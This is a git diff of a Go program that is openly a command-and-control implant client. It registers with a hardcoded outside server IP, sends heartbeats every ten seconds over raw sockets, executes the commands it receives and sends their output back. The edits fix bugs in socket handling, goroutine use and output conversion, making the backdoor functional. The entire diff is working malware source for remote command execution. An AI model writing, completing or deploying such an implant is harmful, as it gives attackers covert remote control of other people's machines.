@@ -15,14 +15,15 @@ import (
 
 // Dynamic globals
 var lastCmdRan string
-var ResponseLog []bytes
 
 // Global statics
 var DestinationPort = 5542
-var SourcePort = 18000
 
 // Send command
-func sendMessageToServer(fd int, iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr, clientMessage string) {
+func sendMessageToServer(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr, clientMessage string) {
+    fd := socket.NewSocket()
+	defer unix.Close(fd)
+
     addr := socket.CreateAddrStruct(iface)
 
 	packet := socket.CreatePacket(iface, src, dst, 18000, DestinationPort, dstMAC, clientMessage)
@@ -31,27 +32,22 @@ func sendMessageToServer(fd int, iface *net.Interface, src net.IP, dst net.IP, d
 
 // Continuously send HELLO messages so that the C2 can respond with commands
 func connectToServer(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
-    fd := socket.NewSocket()
-    defer unix.Close(fd)
-
 	// Register
-	sendMessageToServer(fd, iface, src, dst, dstMAC, socket.GenerateClientMessage(iface.HardwareAddr, src, "JOIN"))
+	sendMessageToServer(iface, src, dst, dstMAC, socket.GenerateClientMessage(iface.HardwareAddr, src, "JOIN"))
 	// packet := socket.CreatePacket(iface, src, dst, 18000, DestinationPort, dstMAC, socket.GenerateClientMessage(iface.HardwareAddr, src, "JOIN"))
 	// socket.SendPacket(fd, iface, addr, packet)
 	fmt.Println("[+] Sent Join")
 
 	// Send heartbeat every ten seconds
-    go func() { 
+    go func() {
+		time.Sleep(1 * time.Second)
 		for {
-			sendMessageToServer(fd, iface, src, dst, dstMAC, socket.GenerateClientHeartbeat(iface.HardwareAddr, src))
+			sendMessageToServer(iface, src, dst, dstMAC, socket.GenerateClientHeartbeat(iface.HardwareAddr, src))
 
 			fmt.Println("[+] Sent Heartbeat")
 			time.Sleep(10 * time.Second)
 		}
-	}
-
-	// Return socket
-	return fd
+	}()
 }
 
 func clientProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) (response string) {
@@ -95,7 +91,7 @@ func execCommand(command string) (response string) {
 		// Save last command we just ran
 		lastCmdRan = command
 		// fmt.Println("[+] OUTPUT:", string(out))
-		return output
+		return string(output)
 	} else {
 		// fmt.Println("[!] Already ran command", command)
 		return ""
@@ -120,14 +116,14 @@ func main() {
 
 	// Create response socket
 	dst := net.IPv4(157, 245, 141, 117)
-	fd := connectToServer(iface, src, dst, dstMAC)
+	connectToServer(iface, src, dst, dstMAC)
 
 	// Listen for commands
 	for {
 		packet, target := socket.ClientReadPacket(readfd, vm)
 		if packet != nil {
-			output := go clientProcessPacket(packet, target, src, fd)
-			sendMessageToServer(fd, iface, src, dst, dstMAC, output)
+			output := clientProcessPacket(packet, target, src)
+			sendMessageToServer(iface, src, dst, dstMAC, output)
 		}
 	}
 }
